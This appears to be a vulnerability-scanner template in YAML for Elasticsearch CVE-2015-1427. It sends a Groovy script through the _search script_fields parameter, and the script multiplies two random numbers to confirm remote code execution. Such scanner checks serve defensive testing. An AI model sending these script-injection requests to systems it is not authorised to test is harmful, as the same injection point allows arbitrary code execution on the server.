detail:
  author: pululin(https://github.com/pululin)
  links:
  - https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-1427
expression: r0() && r1()
manual: true
name: poc-yaml-elasticsearch-cve-2015-1427
rules:
  r0:
    expression: response.status == 201
    request:
      body: "{\n  \"name\": \"test\"\n}\n"
      cache: true
      headers:
        Content-Type: application/json
      method: POST
      path: /test/test
  r1:
    expression: response.status == 200 && response.content_type.icontains("json")
      && response.body.bcontains(bytes(string(r1 * r2)))
    request:
      body: "{\n    \"size\":1,\n    \"script_fields\":{\n        \"lupin\":{\n  \
        \          \"lang\":\"groovy\",\n            \"script\":\"{{r1}}*{{r2}}\"\n\
        \        }\n    }\n}\n"
      cache: true
      headers:
        Content-Type: application/json
      method: POST
      path: /_search
set:
  r1: randomInt(40000, 44800)
  r2: randomInt(40000, 44800)
transport: http
